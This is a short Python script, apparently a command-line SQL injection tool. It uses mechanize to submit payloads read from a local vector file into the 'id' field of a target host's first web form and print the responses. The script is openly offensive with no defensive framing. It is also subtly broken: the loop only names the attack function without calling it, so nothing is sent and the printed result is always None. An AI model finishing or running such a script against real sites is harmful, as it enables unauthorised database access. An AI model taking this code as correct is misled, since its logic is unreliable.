import sys, os, mechanize

request = mechanize.Browser()

def execute_attack(url, sql_attack_str):
    request.open(url)
    request.select_form(nr=0)
    request["id"] = sql_attack_str
    response = request.submit()
    content = response.read()
    print(content)

def start_attack(url, filePath):
  with open(filePath) as f:
    for line in f:
      execute_attack

if __name__ == '__main__':
  filePath = os.path.join(sys.path[0], "sql-inection-vectors.txt")
  # attackID, iface, targetIP, targetPort=None
  argv_len = len(sys.argv)
  if  argv_len < 2:
    print("Invalid input arguments")
    print("python sql-injection.py <target_hostname> [target_port]")
  elif argv_len == 2:
    url = f"http://{sys.argv[1]}"
    ret = start_attack(url, filePath)
    print(f"Attack result: {ret}")
  else:
    url = f"http://{sys.argv[1]}:{sys.argv[2]}"
    ret = start_attack(url, filePath)
    print(f"Attack result: {ret}")